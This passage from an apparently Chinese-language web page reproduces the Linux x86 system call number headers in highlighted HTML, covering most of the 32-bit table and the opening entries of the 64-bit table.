class="meta">#<span class="keyword">define</span> __NR_iopl 110</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vhangup 111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_idle 112</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vm86old 113</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_wait4 114</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_swapoff 115</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sysinfo 116</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ipc 117</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fsync 118</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigreturn 119</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clone 120</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setdomainname 121</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_uname 122</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_modify_ldt 123</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_adjtimex 124</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mprotect 125</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigprocmask 126</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_create_module 127</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_init_module 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_delete_module 129</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_kernel_syms 130</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_quotactl 131</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpgid 132</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchdir 133</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bdflush 134</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sysfs 135</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_personality 136</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_afs_syscall 137</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsuid 138</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsgid 139</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR__llseek 140</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getdents 141</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR__newselect 142</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_flock 143</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msync 144</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readv 145</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_writev 146</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsid 147</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fdatasync 148</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR__sysctl 149</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlock 150</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munlock 151</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlockall 152</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munlockall 153</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setparam 154</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getparam 155</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setscheduler 156</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getscheduler 157</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_yield 158</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_get_priority_max 159</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_get_priority_min 160</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_rr_get_interval 161</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nanosleep 162</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mremap 163</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresuid 164</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresuid 165</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vm86 166</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_query_module 167</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_poll 168</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nfsservctl 169</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresgid 170</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresgid 171</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_prctl 172</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigreturn 173</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigaction 174</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigprocmask 175</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigpending 176</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigtimedwait 177</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigqueueinfo 178</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigsuspend 179</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pread64 180</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwrite64 181</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chown 182</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getcwd 183</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_capget 184</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_capset 185</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigaltstack 186</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendfile 187</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpmsg 188</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_putpmsg 189</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vfork 190</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ugetrlimit 191</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mmap2 192</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_truncate64 193</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ftruncate64 194</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stat64 195</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lstat64 196</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstat64 197</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lchown32 198</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getuid32 199</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgid32 200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_geteuid32 201</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getegid32 202</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setreuid32 203</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setregid32 204</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgroups32 205</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgroups32 206</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchown32 207</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresuid32 208</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresuid32 209</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresgid32 210</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresgid32 211</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chown32 212</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setuid32 213</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgid32 214</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsuid32 215</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsgid32 216</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pivot_root 217</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mincore 218</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_madvise 219</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getdents64 220</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fcntl64 221</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gettid 224</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readahead 225</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setxattr 226</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lsetxattr 227</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fsetxattr 228</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getxattr 229</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lgetxattr 230</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fgetxattr 231</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_listxattr 232</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_llistxattr 233</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_flistxattr 234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_removexattr 235</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lremovexattr 236</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fremovexattr 237</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tkill 238</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendfile64 239</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_futex 240</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setaffinity 241</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getaffinity 242</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_thread_area 243</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_thread_area 244</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_setup 245</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_destroy 246</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_getevents 247</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_submit 248</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_cancel 249</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fadvise64 250</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_exit_group 252</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lookup_dcookie 253</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_create 254</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_ctl 255</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_wait 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_remap_file_pages 257</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_tid_address 258</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_create 259</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_settime 260</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_gettime 261</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_getoverrun 262</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_delete 263</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_settime 264</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_gettime 265</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_getres 266</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_nanosleep 267</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_statfs64 268</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstatfs64 269</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tgkill 270</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utimes 271</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fadvise64_64 272</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vserver 273</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mbind 274</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_mempolicy 275</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_mempolicy 276</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_open 277</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_unlink 278</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_timedsend 279</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_timedreceive 280</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_notify 281</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_getsetattr 282</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kexec_load 283</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_waitid 284</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_add_key 286</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_request_key 287</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_keyctl 288</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioprio_set 289</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioprio_get 290</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_init 291</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_add_watch 292</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_rm_watch 293</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_migrate_pages 294</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_openat 295</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mkdirat 296</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mknodat 297</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchownat 298</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_futimesat 299</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstatat64 300</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unlinkat 301</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_renameat 302</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_linkat 303</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_symlinkat 304</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readlinkat 305</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchmodat 306</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_faccessat 307</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pselect6 308</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ppoll 309</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unshare 310</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_robust_list 311</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_robust_list 312</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_splice 313</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sync_file_range 314</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tee 315</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vmsplice 316</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_move_pages 317</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getcpu 318</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_pwait 319</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utimensat 320</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_signalfd 321</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_create 322</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_eventfd 323</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fallocate 324</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_settime 325</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_gettime 326</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_signalfd4 327</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_eventfd2 328</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_create1 329</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup3 330</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pipe2 331</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_init1 332</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_preadv 333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwritev 334</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_tgsigqueueinfo 335</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_perf_event_open 336</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvmmsg 337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fanotify_init 338</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fanotify_mark 339</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_prlimit64 340</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_name_to_handle_at 341</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_open_by_handle_at 342</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_adjtime 343</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_syncfs 344</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendmmsg 345</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setns 346</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_process_vm_readv 347</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_process_vm_writev 348</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kcmp 349</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_finit_module 350</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setattr 351</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getattr 352</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_renameat2 353</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_seccomp 354</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrandom 355</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_memfd_create 356</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bpf 357</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_execveat 358</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socket 359</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socketpair 360</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bind 361</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_connect 362</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_listen 363</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_accept4 364</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsockopt 365</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setsockopt 366</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsockname 367</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpeername 368</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendto 369</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendmsg 370</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvfrom 371</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvmsg 372</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shutdown 373</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_userfaultfd 374</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_membarrier 375</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlock2 376</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_copy_file_range 377</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_preadv2 378</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwritev2 379</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* _ASM_X86_UNISTD_32_H */</span></span></span><br></pre></td></tr></table></figure></div>
<h3 id="64-位"><a href="#64-位" class="headerlink" title="64 位"></a>64 位</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _ASM_X86_UNISTD_64_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _ASM_X86_UNISTD_64_H 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_read 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_write 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_open 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_close 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stat 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstat 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lstat 6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_poll 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lseek 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mmap 9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mprotect 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munmap 11</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_brk 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigaction 13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigprocmask 14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigreturn 15</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioctl 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pread64 17</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwrite64 18</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readv 19</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_writev 20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_access 21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pipe 22</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_select 23</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_yield 24</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mremap 25</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msync 26</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mincore 27</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_madvise 28</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shmget 29</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shmat 30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shmctl 31</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup2 33</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pause 34</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nanosleep 35</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getitimer 36</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_alarm 37</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setitimer 38</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpid 39</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendfile 40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socket 41</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_connect 42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_accept 43</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendto 44</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvfrom 45</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendmsg 46</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvmsg 47</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shutdown 48</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bind 49</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_listen 50</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsockname 51</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpeername 52</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socketpair 53</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setsockopt 54</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsockopt 55</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clone 56</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fork 57</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vfork 58</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_execve 59</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_exit 60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_wait4 61</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kill 62</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_uname 63</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_semget 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_semop 65</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_semctl 66</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shmdt 67</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msgget 68</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msgsnd 69</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msgrcv 70</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msgctl 71</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fcntl 72</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_flock 73</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fsync 74</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fdatasync 75</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_truncate 76</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ftruncate 77</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getdents 78</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getcwd 79</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chdir 